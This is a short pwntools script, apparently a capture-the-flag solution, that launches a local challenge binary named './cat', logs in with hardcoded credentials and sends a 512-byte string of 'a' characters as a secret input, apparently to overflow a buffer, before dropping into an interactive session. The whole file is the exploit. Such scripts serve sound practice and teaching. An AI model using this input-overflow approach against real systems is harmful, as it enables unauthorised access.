from pwn import *

r = process("./cat")

r.sendlineafter(b"Username: ", b'KCSC_4dm1n1str4t0r')
r.sendlineafter(b"Password: ", b'wh3r3_1s_th3_fl4g')

r.sendlineafter(b'Your secret: ', b'a' * 512)

r.interactive()
